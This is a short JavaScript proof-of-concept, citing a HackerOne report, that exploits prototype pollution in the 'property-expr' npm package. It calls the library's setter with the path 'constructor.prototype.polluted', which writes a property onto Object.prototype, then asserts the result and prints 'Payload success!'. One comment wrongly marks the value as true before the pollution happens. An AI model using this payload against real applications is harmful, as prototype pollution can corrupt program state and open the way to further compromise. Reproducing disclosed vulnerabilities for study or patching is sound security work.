//https://hackerone.com/reports/910206
let expr = require('property-expr')
const assert = require('assert');

obj = {}
console.log({}.polluted) // true

expr.setter('constructor.prototype.polluted')(obj,"yes")

console.log({}.polluted) // true
assert({}.polluted);
console.log("Payload success!")

